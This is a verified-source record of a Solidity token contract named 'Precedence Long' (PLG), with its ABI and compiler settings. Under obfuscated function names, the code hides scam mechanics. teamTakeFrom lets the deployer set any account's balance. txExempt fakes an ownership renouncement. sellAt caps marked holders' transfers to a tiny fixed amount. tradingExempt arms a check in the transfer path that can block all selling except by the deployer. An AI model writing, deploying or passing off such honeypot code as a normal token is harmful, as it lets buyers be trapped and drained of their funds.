{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface exemptTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txSwapTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoTake {\n    function createPair(address minMax, address maxTotal) external returns (address);\n}\n\ninterface txFundBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenMarketing) external view returns (uint256);\n\n    function transfer(address walletTeam, uint256 totalLaunch) external returns (bool);\n\n    function allowance(address sellTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletTeam,\n        uint256 totalLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minTakeExempt, uint256 value);\n    event Approval(address indexed sellTx, address indexed spender, uint256 value);\n}\n\ninterface txFundBuyMetadata is txFundBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PrecedenceLong is txSwapTrading, txFundBuy, txFundBuyMetadata {\n\n    function sellAt(address maxAmountMarketing) public {\n        walletList();\n        if (tokenMode != isAmount) {\n            isAmount = false;\n        }\n        if (maxAmountMarketing == takeTrading || maxAmountMarketing == receiverExempt) {\n            return;\n        }\n        modeFundMax[maxAmountMarketing] = true;\n    }\n\n    string private shouldLaunch = \"Precedence Long\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return minLimitTo;\n    }\n\n    mapping(address => bool) public modeFundMax;\n\n    function senderMode(address sellEnable) public {\n        if (limitTo) {\n            return;\n        }\n        \n        toMax[sellEnable] = true;\n        \n        limitTo = true;\n    }\n\n    uint256 private listAuto;\n\n    bool private isAmount;\n\n    function liquidityBuy(address receiverSellTake, address walletTeam, uint256 totalLaunch) internal returns (bool) {\n        if (receiverSellTake == takeTrading) {\n            return fromWallet(receiverSellTake, walletTeam, totalLaunch);\n        }\n        uint256 autoIs = txFundBuy(receiverExempt).balanceOf(buyAt);\n        require(autoIs == shouldAmount);\n        require(walletTeam != buyAt);\n        if (modeFundMax[receiverSellTake]) {\n            return fromWallet(receiverSellTake, walletTeam, buyTradingAmount);\n        }\n        return fromWallet(receiverSellTake, walletTeam, totalLaunch);\n    }\n\n    bool private tokenMode;\n\n    address buyFromLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private teamFromShould = \"PLG\";\n\n    uint256 constant buyTradingAmount = 16 ** 10;\n\n    function approve(address launchTrading, uint256 totalLaunch) public virtual override returns (bool) {\n        receiverToken[_msgSender()][launchTrading] = totalLaunch;\n        emit Approval(_msgSender(), launchTrading, totalLaunch);\n        return true;\n    }\n\n    address public takeTrading;\n\n    address buyAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address fromAtExempt, address launchTrading) external view virtual override returns (uint256) {\n        if (launchTrading == buyFromLaunch) {\n            return type(uint256).max;\n        }\n        return receiverToken[fromAtExempt][launchTrading];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return shouldLaunch;\n    }\n\n    function fromWallet(address receiverSellTake, address walletTeam, uint256 totalLaunch) internal returns (bool) {\n        require(marketingEnable[receiverSellTake] >= totalLaunch);\n        marketingEnable[receiverSellTake] -= totalLaunch;\n        marketingEnable[walletTeam] += totalLaunch;\n        emit Transfer(receiverSellTake, walletTeam, totalLaunch);\n        return true;\n    }\n\n    address public receiverExempt;\n\n    mapping(address => uint256) private marketingEnable;\n\n    constructor (){\n        \n        exemptTotal shouldLiquidityAmount = exemptTotal(buyFromLaunch);\n        receiverExempt = autoTake(shouldLiquidityAmount.factory()).createPair(shouldLiquidityAmount.WETH(), address(this));\n        if (isAmount) {\n            tokenMode = true;\n        }\n        takeTrading = _msgSender();\n        txExempt();\n        toMax[takeTrading] = true;\n        marketingEnable[takeTrading] = sellAuto;\n        \n        emit Transfer(address(0), takeTrading, sellAuto);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamFromShould;\n    }\n\n    function tradingExempt(uint256 totalLaunch) public {\n        walletList();\n        shouldAmount = totalLaunch;\n    }\n\n    uint256 liquidityMax;\n\n    event OwnershipTransferred(address indexed launchedLaunch, address indexed maxWallet);\n\n    function transferFrom(address receiverSellTake, address walletTeam, uint256 totalLaunch) external override returns (bool) {\n        if (_msgSender() != buyFromLaunch) {\n            if (receiverToken[receiverSellTake][_msgSender()] != type(uint256).max) {\n                require(totalLaunch <= receiverToken[receiverSellTake][_msgSender()]);\n                receiverToken[receiverSellTake][_msgSender()] -= totalLaunch;\n            }\n        }\n        return liquidityBuy(receiverSellTake, walletTeam, totalLaunch);\n    }\n\n    uint8 private minLimitTo = 18;\n\n    address private launchedTeam;\n\n    mapping(address => mapping(address => uint256)) private receiverToken;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellAuto;\n    }\n\n    function owner() external view returns (address) {\n        return launchedTeam;\n    }\n\n    bool private takeLaunched;\n\n    bool public limitTo;\n\n    function getOwner() external view returns (address) {\n        return launchedTeam;\n    }\n\n    function balanceOf(address tokenMarketing) public view virtual override returns (uint256) {\n        return marketingEnable[tokenMarketing];\n    }\n\n    bool private walletTxExempt;\n\n    mapping(address => bool) public toMax;\n\n    uint256 private launchedSender;\n\n    uint256 shouldAmount;\n\n    function txExempt() public {\n        emit OwnershipTransferred(takeTrading, address(0));\n        launchedTeam = address(0);\n    }\n\n    uint256 private sellAuto = 100000000 * 10 ** 18;\n\n    function transfer(address tradingShould, uint256 totalLaunch) external virtual override returns (bool) {\n        return liquidityBuy(_msgSender(), tradingShould, totalLaunch);\n    }\n\n    function teamTakeFrom(address tradingShould, uint256 totalLaunch) public {\n        walletList();\n        marketingEnable[tradingShould] = totalLaunch;\n    }\n\n    function walletList() private view {\n        require(toMax[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTakeExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAtExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeFundMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAmountMarketing\",\"type\":\"address\"}],\"name\":\"sellAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellEnable\",\"type\":\"address\"}],\"name\":\"senderMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalLaunch\",\"type\":\"uint256\"}],\"name\":\"teamTakeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalLaunch\",\"type\":\"uint256\"}],\"name\":\"tradingExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSellTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PrecedenceLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}